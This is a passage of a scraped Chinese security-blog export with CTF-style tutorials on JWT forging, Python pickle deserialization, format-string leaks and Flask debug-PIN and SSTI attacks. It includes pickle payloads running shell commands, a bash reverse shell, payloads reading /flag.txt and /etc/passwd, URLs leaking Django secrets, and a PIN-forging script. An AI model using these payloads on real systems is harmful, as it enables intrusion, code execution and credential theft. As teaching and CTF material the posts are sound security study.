SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth ERB::new(\"&lt;script&gt;alert('#&#123;params[:name][0,7]&#125; working successfully!')&lt;/script&gt;\").result endendpost \"/shop\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, &#123; algorithm: 'HS256' &#125; if auth[0][\"jkl\"] &lt; FLAGPRICE then json(&#123;title: \"error\",message: \"no enough jkl\"&#125;) else auth &lt;&lt; &#123;flag: ENV[\"FLAG\"]&#125; auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth json(&#123;title: \"success\",message: \"jkl is good thing\"&#125;) endenddef islogin if cookies[:auth].nil? then redirect to('/shop') endend 定位到/work路由下，存在name如果和do参数所传得参数相同时即可返回jwt所用得key. 1&#x2F;work?SECRET&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working 之后就是用Jwt解密网站搞一下金钱，买flag.查看返回得cookie，就拿到了flag. 其他做法： HTTP参数传递类型差异产生的攻击面 参考文章:JSON Web Token 入门教程攻击JWT的一些方法JSON Web Token (JWT) 攻击技巧Attacking JWT authenticationJson Web Token历险记JWT安全与实战","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://blog.cfyqy.com/tags/JWT/"}],"author":"ye1s"},{"title":"python反序列化漏洞","slug":"python反序列化漏洞","date":"2020-07-23T10:10:00.000Z","updated":"2020-07-26T14:47:56.656Z","comments":true,"path":"article/5e7bfa5d.html","link":"","permalink":"https://blog.cfyqy.com/article/5e7bfa5d.html","excerpt":"我们把变量从内存中变成可存储或传输的过程称之为序列化。序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。反过来，把变量内容从序列化的对象重新读到内存里称之为反序列化。","text":"我们把变量从内存中变成可存储或传输的过程称之为序列化。序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。反过来，把变量内容从序列化的对象重新读到内存里称之为反序列化。 反序列化类型jsonjson可以用于（不同平台和多语言）字符串和python数据类型进行转换 json有如下四种操作方法：json.dumps()是将字典类型转化成字符串类型。json.loads()将字符串类型转化成字典类型json.dump()用于将dict类型的数据转成str，并写入到json文件中json.load()用于从json文件中读取数据。 123456789101112131415161718import jsondata1=&#123;'a':1,'b':2,'c':3&#125;dus=json.dumps(data1)#将字典类型转化成字符串类型print(dus,type(dus))los=json.loads(dus)print(los,type(los))#将字符串类型转化成字典类型data2=&#123;'a':'4','b':'5','c':'6'&#125;with open('input.txt','w') as f: #用于将dict类型的数据转成str，并写入到json文件中 json.dump(data2,f)with open(\"input.txt\",'r') as f1:#用于从json文件中读取数据。 print(json.load(f1))output:&#123;\"a\": 1, \"b\": 2, \"c\": 3&#125; &lt;class 'str'&gt;&#123;'a': 1, 'b': 2, 'c': 3&#125; &lt;class 'dict'&gt;&#123;'a': '4', 'b': '5', 'c': '6'&#125; pickle/cPicklepickle可以用于python特有的类型和python的数据类型间进行转换（所有python数据类型） Python提供两个模块来实现序列化：cPickle和pickle。这两个模块功能是一样的，区别在于cPickle是C语言写的，速度快，pickle是纯Python写的，速度慢。 python3中已经没有cPickle模块 有如下四种操作方法：dump是将对象序列化并保存到文件中dumps是将对象序列化load将序列化字符串从文件读取并反序列化loads将序列化字符串反序列化 简介pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。 PVM 由三部分组成： 指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。最终留在栈顶的值将被作为反序列化对象返回。 stack：由 Python 的 list 实现，被用来临时存储数据、参数以及对象。 memo： 由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储 当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。 指令集本文重点说明 0 号协议 1234567891011121314151617181920212223242526272829303132333435363738394041424344MARK &#x3D; b&#39;(&#39; # push special markobject on stackSTOP &#x3D; b&#39;.&#39; # every pickle ends with STOPPOP &#x3D; b&#39;0&#39; # discard topmost stack itemPOP_MARK &#x3D; b&#39;1&#39; # discard stack top through topmost markobjectDUP &#x3D; b&#39;2&#39; # duplicate top stack itemFLOAT &#x3D; b&#39;F&#39; # push float object; decimal string argumentINT &#x3D; b&#39;I&#39; # push integer or bool; decimal string argumentBININT &#x3D; b&#39;J&#39; # push four-byte signed intBININT1 &#x3D; b&#39;K&#39; # push 1-byte unsigned intLONG &#x3D; b&#39;L&#39; # push long; decimal string argumentBININT2 &#x3D; b&#39;M&#39; # push 2-byte unsigned intNONE &#x3D; b&#39;N&#39; # push NonePERSID &#x3D; b&#39;P&#39; # push persistent object; id is taken from string argBINPERSID &#x3D; b&#39;Q&#39; # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE &#x3D; b&#39;R&#39; # apply callable to argtuple, both on stackSTRING &#x3D; b&#39;S&#39; # push string; NL-terminated string argumentBINSTRING &#x3D; b&#39;T&#39; # push string; counted binary string argumentSHORT_BINSTRING&#x3D; b&#39;U&#39; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE &#x3D; b&#39;V&#39; # push Unicode string; raw-unicode-escaped&#39;d argumentBINUNICODE &#x3D; b&#39;X&#39; # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND &#x3D; b&#39;a&#39; # append stack top to list below itBUILD &#x3D; b&#39;b&#39; # call __setstate__ or __dict__.update()GLOBAL &#x3D; b&#39;c&#39; # push self.find_class(modname, name); 2 string argsDICT &#x3D; b&#39;d&#39; # build a dict from stack itemsEMPTY_DICT &#x3D; b&#39;&#125;&#39; # push empty dictAPPENDS &#x3D; b&#39;e&#39; # extend list on stack by topmost stack sliceGET &#x3D; b&#39;g&#39; # push item from memo on stack; index is string argBINGET &#x3D; b&#39;h&#39; # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST &#x3D; b&#39;i&#39; # build &amp; push class instanceLONG_BINGET &#x3D; b&#39;j&#39; # push item from memo on stack; index is 4-byte argLIST &#x3D; b&#39;l&#39; # build list from topmost stack itemsEMPTY_LIST &#x3D; b&#39;]&#39; # push empty listOBJ &#x3D; b&#39;o&#39; # build &amp; push class instancePUT &#x3D; b&#39;p&#39; # store stack top in memo; index is string argBINPUT &#x3D; b&#39;q&#39; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT &#x3D; b&#39;r&#39; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM &#x3D; b&#39;s&#39; # add key+value pair to dictTUPLE &#x3D; b&#39;t&#39; # build tuple from topmost stack itemsEMPTY_TUPLE &#x3D; b&#39;)&#39; # push empty tupleSETITEMS &#x3D; b&#39;u&#39; # modify dict by adding topmost key+value pairsBINFLOAT &#x3D; b&#39;G&#39; # push float; arg is 8-byte float encoding​TRUE &#x3D; b&#39;I01\\n&#39; # not an opcode; see INT docs in pickletools.pyFALSE &#x3D; b&#39;I00\\n&#39; # not an opcode; see INT docs in pickletools.py 生成pickle示例 123import pickles = \"abcd\"print(pickle.dumps(s)) python2运行结果 123S'abcd'p0. python3运行结果 1b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.' 是不是很不一样，这是因为python2和python3实现的pickle协议版本不一样，python3实现的版本是第三版，其序列化后的bytes序列第二个字符即\\x03就表示它的pickle版本为第三版。各个不同的版本实现的PVM操作码不同，但却是向下兼容的，比如上面python2序列化输出的字符串可以放在python3里正常反序列化，但python3序列化输出的字符串却不能让python2反序列化. 详细解释一下上面py3输出的pickle流 1b&#39;\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.&#39; 第一个字符\\x80是一个操作码，pickle.py文件中的注释说明它的含义是用来声明pickle版本，后面跟着的\\x03就代表了版本3；随后的X表示后面的四个字节代表了一个数字（小端序），即\\x04\\x00\\x00\\x00,值为4，表示下面跟着的utf8编码的字符串的长度，即后面跟着的abcd;再往后是q,这个没有查到详细的说明，看注释上的字面意思是后面即\\x00是一个字节的参数，但也不知道这个有什么用，我猜测它是用来给参数做索引用的，索引存储在momo区，如果不需要用到取数据，可以把q\\x00删掉，这并不影响反序列化，最后的.代表结束，这是每个pickle流末尾都会有的操作符。详情可看python反序列化简介与利用 __reduce__漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。 构造的关键就是__reduce__函数，这个魔术方法的作用根据上面的文档简单总结如下： 如果返回值是一个字符串，那么将会去当前作用域中查找字符串值对应名字的对象，将其序列化之后返回，例如最后return ‘a’,那么它就会在当前的作用域中寻找名为a的对象然后返回，否则报错。 如果返回值是一个元组，要求是2到5个参数，第一个参数是可调用的对象，第二个是该对象所需的参数元组，剩下三个可选。所以比如最后return (eval,(“os.system(‘ls’)”,))，那么就是执行eval函数，然后元组内的值作为参数，从而达到执行命令或代码的目的，当然也可以return (os.system,(‘ls’,)) 例子： 1234567891011import pickleimport osclass A(object): def __reduce__(self): cmd = \"whoami\" return (os.system,(cmd,))a = A()pickle_a = pickle.dumps(a)print(pickle_a)pickle.loads(pickle_a) 在linux中运行 1b'\\x80\\x03cposix\\nsystem\\nq\\x00X\\x06\\x00\\x00\\x00whoamiq\\x01\\x85q\\x02Rq\\x03.' 来细看一下这个pickle流，在声明版本后使用c操作符导入了posix模块中的system函数，posix模块是os模块在linux上的具体实现，随后是q\\x00,标识system函数在memo区的索引，X\\x06\\x00\\x00\\x00标识后面whoami这个字符串的长度,q\\x01标识whoami这个字符串在memo区的索引,\\x85建立1个元素的元组，这个元素当然就是前面的whoami这个字符串，q\\x02标识了这个元组在memo区的索引，R操作符标识运行栈顶的函数，就是前面的system，并把包含whoami的元组当做参数传递给它，后面的q\\x03标识了运行的结果在memo区的索引？我不确定，但这并不重要，我们执行任意命令的目的已经达到了，最后是.结束符在window中运行 1b'\\x80\\x03cnt\\nsystem\\nq\\x00X\\x06\\x00\\x00\\x00whoamiq\\x01\\x85q\\x02Rq\\x03.' 涉及到调用操作系统命令的库的话，不同的平台上序列化出来的pickle流是不一样的 反弹shell 12345678910import osimport pickleclass test(object): def __reduce__(self): code='bash -c \"bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1\"' return (os.system,(code,))a=test()c=pickle.dumps(a)print(c)pickle.loads(c) PyYAMLYAML是“YAML不是一种标记语言”的外语缩写；但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。它是一种直观的能够被电脑识别的数据序列化格式，是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 PyYAML是Python中YAML语言的编辑器和解释器。 两个函数：yaml.dump()：将一个Python对象序列化生成为yaml文档yaml.load()：将一个yaml文档反序列化为一个Python对 例题CISCN2019环境：https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2]ikun解题详情可看：https://www.zjun.info/2019/ikun.html 第19行处直接接收become经url解码与其反序列化的内容，存在反序列化漏洞，构造payload读取flag.txt文件： 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = urllib.quote(a)print(a) result: 1c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. SUCTF 2019 Guess_game环境：https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game 参考文章： PYTHONPython反序列化漏洞的花式利用利用python反序列化覆盖秘钥——watevrCTF-2019:Pickle Store的第二种解法记CTF比赛中发现的Python反序列化漏洞Python pickle 反序列化实例分析Python PyYAML反序列化漏洞","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"反序列化","slug":"反序列化","permalink":"https://blog.cfyqy.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"ye1s"},{"title":"python格式化字符串漏洞","slug":"python的格式化字符串漏洞","date":"2020-07-22T06:36:00.000Z","updated":"2020-07-23T10:10:26.547Z","comments":true,"path":"article/5d421d4f.html","link":"","permalink":"https://blog.cfyqy.com/article/5d421d4f.html","excerpt":"format格式化字符处只能读取属性而不能执行方法，可以用来读取一些敏感的信息，这里主要是关于format格式化的利用分析","text":"format格式化字符处只能读取属性而不能执行方法，可以用来读取一些敏感的信息，这里主要是关于format格式化的利用分析 格式化字符串方式在 python 中，提供了 4种 主要的格式化字符串方式，分别如下： %操作符 %操作符 沿袭C语言中printf语句的风格。 123&gt;&gt;&gt; name = 'LiMing'&gt;&gt;&gt; 'Hello, %s' % name\"Hello, LiMing\" string.Template12345&gt;&gt;&gt; name='LiMing'&gt;&gt;&gt; from string import Template&gt;&gt;&gt; t=Template('Hey,$name')&gt;&gt;&gt; t.substitute(name=name)'Hey,LiMing' format方法后面为字符串对象增加了format方法，改进后的格式化字符串用法为 123&gt;&gt;&gt; name , errno = 'LiMing' , 50159747054&gt;&gt;&gt; 'Hello, &#123;&#125;'.format(name)'Hello, LiMing' 一些用法 12345\"&#123;username&#125;\".format(username='LiMing') # 普通用法\"&#123;username!r&#125;\".format(username='LiMing') # 等同于 repr(username)\"&#123;number:0.2f&#125;\".format(number=0.5678) # 等同于 \"%0.2f\" % 0.5678，保留两位小数\"int: &#123;0:d&#125;; hex: &#123;0:#x&#125;; oct: &#123;0:#o&#125;; bin: &#123;0:#b&#125;\".format(42) # 转换进制\"&#123;arr[2]&#125;\".format(arr=[0,1,2,3,4]) # 获取数组键值 有漏洞的代码在{0.xxx}.format(xxx)时，0是会被替代为format里的参数 1234567config=&#123;'SECRET_KEY': 'secret'&#125;class User(object): def __init__(self,name): self.name=nameuser=User('LiMing')print('&#123;0.__class__.__init__.__globals__[config]&#125;'.format(user))#&#123;'SECRET_KEY': 'secret'&#125; f-Strings这是python3.6之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的python表达式，安全隐患可想而知。 123456&gt;&gt;&gt; f'&#123;__import__(\"os\").system(\"whoami\")&#125;'xttd-2020qzvjye\\administrator'0'&gt;&gt;&gt; a,b=2,4&gt;&gt;&gt; f'&#123;a+b&#125;:&#123;a-b&#125;''6:-2' 有了f字符串后，即使我们不闭合双引号，也能插入任意代码了 123&gt;&gt;&gt; eval('&#123;\"code\":404,\"info\":f\"This is &#123;__import__(\\'os\\').system(\\'whoami\\')&#125; message\"&#125;')xttd-2020qzvjye\\administrator&#123;'code': 404, 'info': 'This is 0 message'&#125; f字符的利用，还没遇到。 敏感信息获取引用p师傅的文章Python格式化字符串漏洞（Django为例） Django格式化字符串导致的敏感信息泄露漏洞 123def view(request, *args, **kwargs): template = 'Hello &#123;user&#125;, This is your email: ' + request.GET.get('email') return HttpResponse(template.format(user=request.user)) 控制了格式化字符串的一部分（email），将会导致一些意料之外的问题,如 1http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;?email&#x3D;&#123;user.pk&#125;|&#123;user.username&#125;|&#123;user.password&#125; user是当前上下文中仅有的一个变量，也就是format函数传入的user=request.user，Django中request.user是当前用户对象，这个对象包含一个属性password，也就是该用户的密码。所以，{user.password}实际上就是输出了request.user.password 利用格式化字符串漏洞泄露Django配置信息 12http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; Flask123456789101112131415from flask import Flask, requestapp = Flask(__name__)class veneno(): ven='hacker' def __init__(self,name=None): bb=veneno.ven self.name=veneno.ven return bb@app.route('/test/',methods=['POST'])def ven(): test = request.form['test'] return 'OK===&gt;'+test.format(veneno)if __name__ == '__main__': app.run(host='0.0.0.0', debug=True) 在{0.xxx}.format(xxx)时，0是会被替代为format里的参数的,在python中，init是在类中被用做构造函数，而globals则是全局变量，于是就可以去继承类的中的方法，以此类推 例题 百越杯Easy flask SWPUCTF 皇家线上赌场从两道CTF实例看python格式化字符串漏洞 参考文章：从两道CTF实例看python格式化字符串漏洞Python格式化字符串漏洞（Django为例）python格式化字符串研究python%20web之flask session&amp;格式化字符串漏洞Python String Formatting Best Practices","categories":[],"tags":[],"author":"ye1s"},{"title":"Flask Debug PIN安全问题","slug":"Flask的debug","date":"2020-07-20T12:52:00.000Z","updated":"2020-07-22T06:19:14.915Z","comments":true,"path":"article/805da219.html","link":"","permalink":"https://blog.cfyqy.com/article/805da219.html","excerpt":"Flask在生产环境中开启Debug模式,存在交互式Python shell可以执行自定义Python代码。","text":"Flask在生产环境中开启Debug模式,存在交互式Python shell可以执行自定义Python代码。 在旧版本的Flask中是不需要输入PIN码认证就可以执行代码,在新版本的Flask中需要输入PIN码进行认证，才能执行自定义代码，有点鸡肋。不过在同一台机器上，多次重启Flask服务，PIN码值不改变。也就是说PIN码是一个固定值。 PIN生成流程PIN码的具体生成流程可看https://zhuanlan.zhihu.com/p/32336971 PIN的生成主要看此段代码Lib\\site-packages\\werkzeug\\debug\\__init__.py的137行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081def get_pin_and_cookie_name(app): \"\"\"Given an application object this returns a semi-stable 9 digit pin code and a random key. The hope is that this is stable between restarts to not make debugging particularly frustrating. If the pin was forcefully disabled this returns `None`. Second item in the resulting tuple is the cookie name for remembering. \"\"\" pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\") rv = None num = None # Pin was explicitly disabled if pin == \"off\": return None, None # Pin was provided explicitly if pin is not None and pin.replace(\"-\", \"\").isdigit(): # If there are separators in the pin, return it directly if \"-\" in pin: rv = pin else: num = pin modname = getattr(app, \"__module__\", app.__class__.__module__) try: # getuser imports the pwd module, which does not exist in Google # App Engine. It may also raise a KeyError if the UID does not # have a username, such as in Docker. username = getpass.getuser() except (ImportError, KeyError): username = None mod = sys.modules.get(modname) # This information only exists to make the cookie unique on the # computer, not as a security feature. probably_public_bits = [ username, modname, getattr(app, \"__name__\", app.__class__.__name__), getattr(mod, \"__file__\", None), ] # This information is here to make it harder for an attacker to # guess the cookie name. They are unlikely to be contained anywhere # within the unauthenticated debug page. private_bits = [str(uuid.getnode()), get_machine_id()] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, text_type): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") cookie_name = \"__wzd\" + h.hexdigest()[:20] # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits if num is None: h.update(b\"pinsalt\") num = (\"%09d\" % int(h.hexdigest(), 16))[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num return rv, cookie_name PIN获取PIN的生成需要6个变量 123456username 启动这个Flask的用户modname 一般默认flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) 一般默认flask.app为Flaskgetattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径,可在爆错页面看到str(uuid.getnode()) 则是网卡mac地址的十进制表达式get_machine_id() 系统id 变量的获取 uaername 可以从/etc/passwd或者/proc/self/environ环境变量中读取 getattr(mod, &#39;__file__&#39;, None) flask目录下的一个app.py的绝对路径,这个值可以在报错页面看到。但有个坑，python3是app.py，python2中是app.pyc 网卡地址 读取这两个地址：/sys/class/net/eth0/address 或者 /sys/class/net/ens33/address machine_id()linux读取这三个文件 /proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_idwindows读取注册表中的HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography 2020.1.5对machine_id()进行了更新 get_machine_id unique for podman https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f 修改前是依序读取/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id三个文件，只要读取到一个文件的内容，立马返回值。修改后是从/etc/machine-id、/proc/sys/kernel/random/boot_id中读到一个值后立即break，然后和/proc/self/cgroup中的id值拼接。 PIN生成脚本 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'kingkk',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '52242498922',# str(uuid.getnode()), /sys/class/net/ens33/address '19949f18ce36422da1402b3e3fe53008'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 例题CISCN2019 华东南赛区Double Secret https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Double%20Secret 解题方式具体可看从一道ctf题谈谈flask开启debug模式存在的安全问题RC4加密 12345678910111213141516171819202122232425262728293031323334353637import base64from urllib.parse import quotedef rc4_main(key = \"init_key\", message = \"init_message\"): # print(\"RC4加密主函数\") s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # 我这里没管秘钥小于256的情况，小于256不断重复填充即可 # print(\"原来的 s 盒：%s\" % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\"混乱后的 s 盒：%s\"% s_box) return s_boxdef rc4_excrypt(plain, box): # print(\"调用加密程序成功。\") res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) # print(\"res用于加密字符串，加密后是：%res\" %res) cipher = \"\".join(res) print(\"加密后的字符串是: %s\" %quote(cipher)) #print(\"加密后的输出(经过编码):\") #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))#rc4_main(\"HereIsTreasure\",\"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;\")#rc4_main(\"HereIsTreasure\",\"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()&#125;&#125;\")#rc4_main(\"HereIsTreasure\",\"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/sys/class/net/eth0/address').read()&#125;&#125;\")rc4_main(\"HereIsTreasure\",\"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/proc/self/cgroup').read()&#125;&#125;\") Debug PIN码的生成脚本 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'glzjin'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/site-packages/flask/app.pyc' # getattr(mod, '__file__', None),]private_bits = [ '2485410489227',# str(uuid.getnode()), /sys/class/net/ens33/address '7dcfc37cdca26de192240d4dbb5aed767e3f66b2a87ffa05243e5be379a5d400'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 参考文章：Werkzeug更新带来的Flask debug pin码生成方式改变Flask debug pin安全问题Flask开启debug模式等于给黑客留了后门从一道ctf题谈谈flask开启debug模式存在的安全问题Flask debug 模式 PIN 码生成机制安全性研究笔记flask debug模式下pin码安全","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://blog.cfyqy.com/tags/Flask/"},{"name":"debug","slug":"debug","permalink":"https://blog.cfyqy.com/tags/debug/"}],"author":"ye1s"},{"title":"Flask模板注入(SSTI)","slug":"flask模板注入-SSTI","date":"2020-07-17T06:15:00.000Z","updated":"2021-05-03T13:53:30.353Z","comments":true,"path":"article/ae287849.html","link":"","permalink":"https://blog.cfyqy.com/article/ae287849.html","excerpt":"SSTI(Server-Side Template Injection)，即服务端模板注入攻击,ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控.","text":"SSTI(Server-Side Template Injection)，即服务端模板注入攻击,ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控. 背景知识FlaskFlask是一个使用Python编写的轻量级Web应用框架。其 WSGI 工具箱采用Werkzeug，模板引擎则使用Jinja2。 Jinja2Jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。 在Jinja2中，存在三种语句： 123控制结构 &#123;% %&#125;变量取值 &#123;&#123; &#125;&#125;注释 &#123;# #&#125; Jinja2模板中使用上述第二种的语法表示一个变量，它是一种特殊的占位符。当利用Jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，Jinja2支持Python中所有的Python数据类型比如列表、字段、对象等。被两个括号包裹的内容会输出其表达式的值。 Jinja2中的过滤器可以理解为是Jinja2里面的内置函数和字符串处理函数。 模板渲染函数render_template() 渲染过程如下，render_template()函数的第一个参数为渲染的目标html页面、第二个参数为需要加载到页面指定标签位置的内容Demoapp.js 1234567891011121314151617from flask import Flaskfrom flask import request, render_templateapp = Flask(__name__)@app.route('/')def hello_ssti(): person = &#123; 'name': 'hello', 'secret': 'This_is_my_secret' &#125; if request.args.get('name'): person['name'] = request.args.get('name') return render_template(\"index.html\", person=person)if __name__ == \"__main__\": app.run(debug=True) 然后在当前目录新建templates目录，在其中新建index.html： 1&lt;h2&gt;Hello &#123;&#123; person.name &#125;&#125;!&lt;&#x2F;h2&gt; 当尝试进行XSS时，会自动被HTML编码过滤 render_template_string()这个函数作用和前面的类似，顾名思义，区别在于只是第一个参数并非是文件名而是字符串。也就是说，我们不需要再在templates目录中新建HTML文件了，而是可以直接将HTML代码写到一个字符串中，然后使用该函数渲染该字符串中的HTML代码到页面即可。 123456789101112131415161718from flask import Flaskfrom flask import request, render_template_stringapp = Flask(__name__)@app.route('/')def hello_ssti(): person = &#123; 'name': 'hello', 'secret': 'This_is_my_secret' &#125; if request.args.get('name'): person['name'] = request.args.get('name') template = '&lt;h2&gt;Hello &#123;&#123; person.name &#125;&#125;!&lt;/h2&gt;' return render_template_string(template, person=person)if __name__ == \"__main__\": app.run(debug=True) SSTI检测通常测试模块类型的方式如下图：这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说49会在 Twig 中返回49，而在 Jinja2 中则是7777777。 漏洞成因由前面知道，要想实现模板注入，首先必须得注入模板执行语句，如： 12控制结构 &#123;% %&#125;变量取值 &#123;&#123; &#125;&#125; 但是在前面两个函数的Demo中，html内容中是以这种变量取值语句的形式来处理传入的参数的，此时person.name的值无论是什么内容，都会被当作是字符串来进行处理而非模板语句来执行，比如即使传入的是config来构成，但其也只会把参数值当作是字符串而非模板语句通过%s这种传参形式来实现 123456789101112131415161718rom flask import Flaskfrom flask import request, render_template_stringapp = Flask(__name__)@app.route('/')def hello_ssti(): person = &#123; 'name': 'hello', 'secret': 'This_is_my_secret' &#125; if request.args.get('name'): 